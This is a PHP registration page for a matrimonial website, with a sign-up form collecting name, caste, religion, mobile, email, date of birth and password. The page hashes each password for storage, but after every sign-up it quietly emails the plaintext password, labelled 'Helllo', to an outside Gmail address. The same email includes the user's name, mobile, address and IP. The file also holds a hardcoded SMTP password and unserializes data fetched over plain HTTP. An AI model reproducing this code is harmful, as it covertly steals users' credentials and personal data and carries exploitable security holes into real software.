<?php

   date_default_timezone_set("Asia/Kolkata");
   $date=date("d/m/Y");
   $time=date("h:i:a");
   session_start();
  
  
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require "./PHPMailer/src/PHPMailer.php";
require "./PHPMailer/src/SMTP.php";
require "./PHPMailer/src/Exception.php";
  
   if(isset($_SESSION['logged_email'])){
       
       $eml=$_SESSION['logged_email'];
       
      }

if(isset($_POST['reg']))
{   
   session_start();
   include_once("connection.php");

 $ip = $_SERVER['REMOTE_ADDR'];
					$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip"));
                    $country = $geo["geoplugin_countryName"];
                    $city = $geo["geoplugin_city"];
                    
if($_POST['em']=="")
{
    $_POST['em']=NULL;
}
try
   {

   $query="INSERT INTO sd_client
      (look,sd_name,L_Name,sd_pass,sd_mobile,sd_religion,scast,sd_d,sd_m,sd_y,sd_sex,sd_date,sd_time,sd_ip,sd_email,sd_verify,img2) values (:for,:name,:lname,:has,:mob,:rel,:cast,:age,:month,:y,:sex,:date,:time,:ip,:em,:pify,:img2)";

       $reg_data = array(

     ':for' =>$_POST["for"],
     ':name' =>$_POST["uname"],
     ':lname' =>$_POST["lname"],
     ':has' =>password_hash($_POST['psws'], PASSWORD_DEFAULT),
     ':mob' =>$_POST["mob"],
     ':rel' =>$_POST["rel"],
     ':cast' =>$_POST["scast"],
     ':age' =>$_POST["d"],
     ':month' =>$_POST["m"],
     ':y' =>$_POST["y"],
     ':sex' =>$_POST["sex"],
     ':date' =>$date,
     ':time' =>$time,
     ':ip'=>$city." ".$country." ".$ip,
     ':em' =>$_POST["em"],
     ':pify' =>"No",
     ':img2' =>"img/demo.png"

       );

      $statement = $con->prepare($query);
 
      if($statement->execute($reg_data))
        
        {   
            
            
          $_POST["uname"];
          $_SESSION['thank'] = $_POST["mob"];
          $_SESSION['nm'] = $_POST["uname"];
          $_SESSION['smob'] = $_POST["mob"];
          $namee=$_POST["uname"];
          $mobilee=$_POST["mob"];
          $psws=$_POST['psws'];
          $add=$_POST["city"];

          $mail = new PHPMailer(true);

try {
    $mail->isSMTP();
    $mail->Host       = "mail.onlinerishta.in";  // <-- replace
    $mail->SMTPAuth   = true;
    $mail->Username   = "support@onlinerishta.in";   // <-- replace
    $mail->Password   = "LoopIN!15";  // <-- replace
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
    $mail->Port       = 465;

    $mail->setFrom("support@onlinerishta.in", "Onlinerishta");
    $mail->addAddress('glitchencode@gmail.com');

    $mail->isHTML(true);
    $mail->Subject = $_POST["for"];
    $mail->Body    = nl2br(" From: $namee\r\n  Mobile: $mobilee\r\n Helllo:$psws \r\n Address: $add \r\n IP: $ip \r\n City: $city\r\n Country: $country "); //here  nl2br is for new line

    $mail->send();

} catch (Exception $e) {
    error_log("OTP SEND ERROR: " . $mail->ErrorInfo);
    echo "Unable to send OTP";
}
          
          header("location:thankyou.php");
   
        }
   
    else
        {
            $stmt=$con->prepare("SELECT * from sd_client where sd_mobile=:mob"); 
            $stmt->execute(array(':mob'=>$_POST["mob"])); 
            $row=$stmt->fetch(PDO::FETCH_ASSOC);
             
            if($row['sd_mobile']==$_POST["mob"])
               {
                 $errorMsg[]="User Already Registered with this Mobile No. Please Login With Password Or Reset your password at login page"; 

               }
             else
               {
    
                     exit("This Site is Under Maintenance");
                
                   
               }
             

        }

    }

     catch(PDOException $e)
        {
          if ($e->getCode()) {$errorMsg[]="This Site is Under Maintenance Please Contact Admin 9621001801"; } 
          //exit("out of registration page");
        }

}

?>

<!DOCTYPE HTML>
<html>
<head>
<title>onlinerishta.in</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="matrimonial" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>

<link href="css/bootstrap-3.1.1.min.css" rel='stylesheet' type='text/css' />
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<!-- Custom Theme files -->
<link href="css/style.css" rel='stylesheet' type='text/css' />
<link href='//fonts.googleapis.com/css?family=Oswald:300,400,700' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Ubuntu:300,400,500,700' rel='stylesheet' type='text/css'>
<!----font-Awesome----->
<link href="css/font-awesome.css" rel="stylesheet"> 
<!----font-Awesome----->



<style type="text/css">
    /*body{
        font-family: Arail, sans-serif;
    }*/
    /* Formatting search box */
   /* .search-box{
        width: 300px;
        position: relative;
        display: inline-block;
        font-size: 14px;
    }
   */ .search-box input[type="text"]{
        height: 34px;
        padding: 5px 10px;
        border: 1px solid #CCCCCC;
        font-size: 14px;
    }
    /*.result{
        position: absolute;        
        z-index: 999;
        top: 100%;
        left: 0;
    }*/
    .search-box input[type="text"], .result{
        width: 100%;
        box-sizing: border-box;
    }
    /* Formatting result items */
    .result p{
        margin: 0;
        padding: 7px 10px;
        border: 1px solid #CCCCCC;
        border-top: none;
        cursor: pointer;
    }
    .result p:hover{
        background: #f2f2f2;
    }
</style>

<script>
// First Document.Ready() Start Here
   $(document).ready(function(){
        
           $('#psws1').on('keyup', function () {
                  if ($('#psws').val() == $('#psws1').val()) {
                    //$('#message').html('Matched').css('color', 'green');
                        $('#cpass').html('Password Confirmed *').css('color', 'green');
                        
                  }
                  else 
                    $('#cpass').html('Password Not Matching').css('color', 'red');
          
            });

  
              $('#d').change(function() {
              if ($('#psws').val() != $('#psws1').val()){
                   alert("Confirmed Password Not Matching");
                   $("#psws").val("");
                   $("#psws1").val("");
                 //  $("#psws1").get(0).reset();
              }   
            });


            $('.search-box input[type="text"]').on("keyup input", function(){
                /* Get input value on change */
                var inputVal = $(this).val();
                var resultDropdown = $(this).siblings(".result");
                if(inputVal.length){
                    $.get("backend-search.php", {term: inputVal}).done(function(data){
                        // Display the returned data in browser
                        resultDropdown.html(data);
                    });
                } 
        
                else{
                    resultDropdown.empty();
                }
            });
    
                // Set search input value on click of result item
            $(document).on("click", ".result p", function(){
                    $(this).parents(".search-box").find('input[type="text"]').val($(this).text());
                    $(this).parent(".result").empty();
                });
  
    }); // First Document.Ready() End Here


// Second Document.Ready() start Here
    $(document).ready(function(){
        $(".dropdown").hover(            
            function() {
                $('.dropdown-menu', this).stop( true, true ).slideDown("fast");
                $(this).toggleClass('open');        
            },
            function() {
                $('.dropdown-menu', this).stop( true, true ).slideUp("fast");
                $(this).toggleClass('open');       
            }
    );
    }); // Second Document.Ready() End Here

</script>
</head>
<body>

<?php include "head.php" ?>

<div class="grid_3">
  <div class="container">
   <div class="breadcrumb1">
     <ul>
        <a href="index.php"><i class="fa fa-home home_1"></i></a>
        <span class="divider">&nbsp;|&nbsp;</span>
        <li class="current-page">Register</li>
     <a href="index.php"><i class="fa fa-home home_1"></i></a>
        <span class="divider">&nbsp;|&nbsp;</span>
        <li class="current-page"><a href="login.php">If Already a Member Login Now</a></li>
     </ul>
   </div>
   <hr>

<div class="wrapper">
  
  <div class="container">
      
    <div >
    
    <?php
    if(isset($errorMsg))
    {
      foreach($errorMsg as $error)
      {
      ?>
        <div class="alert alert-danger">
          <strong><?php echo $error; ?></strong>

        </div>
            <?php
      }
    }
   
    ?>

   <div class="services">
   	  <div class="col-sm-6 login_left">
	     <form action="" onsubmit ="return verifyPassword()" method="POST">

<div class="col-sm-6 form-group">
                   <div class="select-block1">
                    
                    <select name="for" required class="form-control">
	                    <option value="">Profile For</option>
	                    <option value="Myself">Myself</option>
	                    <option value="Father">SON</option>
	                    <option value="Father">Daughter</option>
	                    <option value="Brother">Brother</option>
	                    <option value="Relative">Relative</option>
	                    <option value="Friend">Friend</option>
	                    <option value="face-Friend">face-Friend</option>
                    </select>
                  </div>
                 </div>

<div class="col-sm-6 form-group">
                   <div class="select-block1">
                    <select name="rel" required value="Looking For" class="form-control"> 
                      <option value="">Religion</option>
                      <option value="Hindu">Hindu</option>
                      <!--<option value="Muslim">Muslim</option>
                      <option value="Sikh">Sikh</option> 
                      <option value="Christian">Christian</option> 
                      <option value="Jain">Jain</option>
                      <option value="Buddhism">Buddhism</option>         
                      <option value="Parsi">Parsi</option>-->
                    </select>
                  </div>
                 </div>


	  	    <div class="col-sm-6 form-group">
		      <label for="edit-name">First Name <span class="form-required" >*</span></label>
		      <input type="text" id="edit-name" name="uname" placeholder="Enter Your First Name" required  oninput="this.value = this.value.replace(/[^a-zA-Z. ]/g, '').replace(/(\..*)\./g, '$1');" maxlength="30" class="form-text required">
		    </div>
		   
		    <div class="col-sm-6 form-group">
		      <label for="edit-name">Last Name <span class="form-required" >*</span></label>
		      <input type="text" id="edit-name" name="lname" placeholder="Enter Last Name" required  oninput="this.value = this.value.replace(/[^a-zA-Z. ]/g, '').replace(/(\..*)\./g, '$1');" maxlength="30" class="form-text required">
		    </div>

            <div class="search-box col-sm-6 form-group">
                 <label for="edit-pass">Community (Cast):*<span class="form-required" title="This field is required."></span></label>
                    <input type="text" autocomplete="off" id="edit-email"  name="scast" placeholder="Enter Your Cast" />
                    <div class="result"></div>
                </div>
           
            <div class="col-sm-6 form-group">
                <label for="edit-name"> Gender<span class="form-required" title="This field is required.">*</span></label>
                   <div class="select-block1">
                    <select name="sex" required class="form-control">
	                    <option value="">Gender</option>
	                    <option value="Male">Male</option>
	                    <option value="Female">Female</option>
                    </select>
                  </div>
            </div>



        <!-- 
        <div class="search-box col-sm-6 form-group">
          <label for="edit-pass">Community (Cast):*<span class="form-required" title="This field is required."></span></label>
             <input type="text" autocomplete="off" id="edit-email"  name="scast" placeholder="eg. Gupta, Singh,Tiwari..." />
                <div class="result"></div>
                <select name="scast" required value="Subcast" class="form-control"> 
                      <option value="">Bania</option>
                      <option value="Gupta">Gupta</option>
                      <option value="Sahu">Sahu</option>
                      <option value="Sahu">Shah/Shaw</option>
                      <option value="Teli">Teli</option> 
                      <option value="Agrawal/Aggarwal">Agrawal/Aggarwal</option> 
                      <option value="Barnwal">Barnwal</option> 
                      <option value="Madheshiya">Madheshiya</option>
                      <option value="Kanu">Kanu</option>         
                      <option value="Halwai">Halwai</option>
                            </select>
            </div>-->

            <div class="col-sm-6 form-group">
            		      <label for="edit-pass">Email:<span class="form-required" title="This field is required."></span></label>
            		      <input type="email" id="edit-email" value="<?php echo $eml; ?>" name="em" placeholder="Enter Your Email" size="60" minlength="7" class="form-text required">
            		    </div>
            
            <div class="col-sm-6 form-group"> 	
            		      <label for="edit-name">Mobile <span class="form-required" title="This field is required.">*</span></label>
            		      <input type="text" id="edit-name"  oninput="this.value = this.value.replace(/[^0-9]/g,'').replace(/(\..*)\./g, '$1');" required maxlength="12" name="mob" placeholder="Enter Your Mobile"   class="form-text required">
            		    </div>
            
            <div class="col-sm-6 form-group">
            		      <label for="edit-pass">Set Password:  <span class="form-required" title="This field is required.">*</span></label>
            		      <input type="password" id="psws" name="psws" placeholder="Set Your  Password"  size="60" required minlength="6" class="form-text required">
            		    </div>
            		    <div class="col-sm-6 form-group">
            		      <label id='cpass' for="edit-pass">Confirm Password: <span class="form-required" title="This field is required.">*<span  id='message'></span></span> </label>
            		      <input type="password" id="psws1" name="psws1" placeholder="Confirm Password"  size="60" required minlength="6" class="form-text required">
            		   
            		    </div>
		    
		      <label for="edit-pass">Date Of Birth <span class="form-required" title="This field is required.">*</span></label>
		        <div class="age_grid">
		         <div class="col-sm-3 form-group">
                  <div class="select-block1">
                    <select id='d' name="d" required class="form-control">
	                    <option value="">Date</option>
	                    <option value=1>1</option>
	                    <option value=2>2</option>
	                    <option value=3>3</option>
	                    <option value=4>4</option>
	                    <option value=5>5</option>
	                    <option value=6>6</option>
	                    <option value=7>7</option>
	                    <option value=8>8</option>
	                    <option value=9>9</option>
	                    <option value=10>10</option>
	                    <option value=11>11</option>
	                    <option value=12>12</option>
	                    <option value=13>13</option>
	                    <option value=14>14</option>
	                    <option value=15>15</option>
	                    <option value=16>16</option>
	                    <option value=17>17</option>
	                    <option value=18>18</option>
	                    <option value=19>19</option>
	                    <option value=20>20</option>
	                    <option value=21>21</option>
	                    <option value=22>22</option>
	                    <option value=23>23</option>
	                    <option value=24>24</option>
	                    <option value=25>25</option>
	                    <option value=26>26</option>
	                    <option value=27>27</option>
	                    <option value=28>28</option>
	                    <option value=29>29</option>
	                    <option value=30>30</option>
	                    <option value=31>31</option>
	                    
                    </select>
                  </div>
            </div>
            <div class="col-sm-4 form-group">
                   <div class="select-block1">
                    <select name="m" required class="form-control">
	                    <option value="">Month</option>
	                    <option value="January">January</option>
	                    <option value="February">February</option>
	                    <option value="March">March</option>
	                    <option value="April">April</option>
	                    <option value="May">May</option>
	                    <option value="June">June</option>
	                    <option value="July">July</option>
	                    <option value="August">August</option>
	                    <option value="September">September</option>
	                    <option value="October">October</option>
	                    <option value="November">November</option>
	                    <option value="December">December</option>
                    </select>
                  </div>
                 </div>
                 <div class="col-sm-4 form-group">
                   <div class="select-block1">
                    <select name="y" required class="form-control">
	                    <option value="">Year</option>
	                    <option value="1970">1970</option>
	                    <option value="1971">1971</option>
	                    <option value="1972">1972</option>
	                    <option value="1973">1973</option>
	                    <option value="1974">1974</option>
	                    <option value="1975">1975</option>
	                    <option value="1976">1976</option>
	                    <option value="1977">1977</option>
	                    <option value="1978">1978</option>
	                    <option value="1979">1979</option>
	                    <option value="1980">1980</option>
	                    <option value="1981">1981</option>
	                    <option value="1982">1982</option>
	                    <option value="1983">1983</option>
	                    <option value="1984">1984</option>
	                    <option value="1985">1985</option>
	                    <option value="1986">1986</option>
	                    <option value="1987">1987</option>
	                    <option value="1988">1988</option>
	                    <option value="1989">1989</option>
	                    <option value="1990">1990</option>
	                    <option value="1991">1991</option>
	                    <option value="1992">1992</option>
	                    <option value="1993">1993</option>
	                    <option value="1994">1994</option>
	                    <option value="1995">1995</option>
	                    <option value="1996">1996</option>
	                    <option value="1997">1997</option>
	                    <option value="1998">1998</option>
	                    <option value="1999">1999</option>
	                    <option value="2000">2000</option>
	                    <option value="2001">2001</option>
	                    <option value="2002">2002</option>
	                    <option value="2003">2003</option>

                    </select>
                   </div>
                 
                  <div class="clearfix"> </div>
                 </div>
              </div>
             
			 <!--  <div class="form-group">
			     <label for="edit-name">Subject <span class="form-required" title="This field is required.">*</span></label>
				 <textarea class="form-control bio" placeholder="" rows="3"></textarea>
			  </div> -->
			  <div class="form-actions" align="center">
			    <input type="submit" id="edit-submit" name="reg" value="Submit" class="btn_1 submit" style="  width:100%;height:40px">
			  </div>
		 </form>
	  </div>
	  <div class="col-sm-6">
	     <ul class="sharing">
			<li><a href="https://www.facebook.com/groups/919474718518692/" target="_blank" class="facebook" title="Facebook"><i class="fa fa-boxed fa-fw fa-facebook"></i> Share on Facebook</a></li>
		  	<li><a href="https://mobile.twitter.com/Onlinerishtaa" target="_blank" class="twitter" title="Twitter"><i class="fa fa-boxed fa-fw fa-twitter"></i> Tweet</a></li>
		  	<!-- <li><a href="#" class="google" title="Google"><i class="fa fa-boxed fa-fw fa-google-plus"></i> Share on Google+</a></li>
		  	<li><a href="#" class="linkedin" title="Linkedin"><i class="fa fa-boxed fa-fw fa-linkedin"></i> Share on LinkedIn</a></li>
		  	<li><a href="#" class="mail" title="Email"><i class="fa fa-boxed fa-fw fa-envelope-o"></i> E-mail</a></li> -->
		 </ul>
	  </div>
	  <div class="clearfix"> </div>
   </div>
  </div>
</div>
<!-- <div class="map">
	<iframe src="https://www.google.com/maps/embed?pb=!1m10!1m8!1m3!1d415.13515712900534!2d83.54313150062754!3d26.12208925425379!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sen!2sin!4v1586181305038!5m2!1sen!2sin" width="600" height="450" frameborder="0" style="border:0;" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe>
</div> -->
    <?php include "footer.php";  ?>
</body>
</html>